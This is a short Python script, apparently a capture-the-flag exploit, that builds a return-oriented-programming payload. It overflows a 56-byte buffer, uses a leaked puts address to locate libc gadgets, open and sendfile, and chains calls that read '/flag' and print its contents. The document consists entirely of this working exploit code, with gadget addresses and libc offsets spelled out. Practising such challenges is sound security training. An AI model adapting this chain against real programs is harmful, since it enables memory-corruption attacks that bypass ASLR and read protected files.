#!/usr/bin/env python3

from struct import pack

payload = b'a' * 56
addr_of_puts = 0x875a0
addr_diff_rdx_rop = 0x11c371 - addr_of_puts
addr_diff_rcx_rop = 0x9f822 - addr_of_puts
addr_diff_open = 0x110e50 - addr_of_puts
addr_diff_sendfile = 0x116100 - addr_of_puts

addr_of_puts_runtime = int(input("Give me the address of puts: "), 16)

# 0x4040c0 is the address of a global variable.
# read(0, 0x4040c0, 6);
payload += pack("<Q", 0x401b73) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401b71) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 0x4040c0) # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", addr_of_puts_runtime + addr_diff_rdx_rop) # pop rdx ; pop r12 ; ret
payload += pack("<Q", 6)        # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", 0x401140) # <read@plt>

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x401b73) # pop rdi ; ret
payload += pack("<Q", 0x4040c0) # address of string /flag
payload += pack("<Q", 0x401b71) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 0x0)      # data
payload += pack("<Q", 0x1)      # meaningless data
payload += pack("<Q", addr_of_puts_runtime + addr_diff_open) # <__open@@GLIBC_2.2.5>

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x401b73) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x401b71) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x1)      # meaningless data
payload += pack("<Q", addr_of_puts_runtime + addr_diff_rdx_rop) # pop rdx ; pop r12 ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", addr_of_puts_runtime + addr_diff_rcx_rop) # pop rcx ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", addr_of_puts_runtime + addr_diff_sendfile) # <sendfile@@GLIBC_2.2.5>

with open("payload2", "wb") as f:
    f.write(payload)
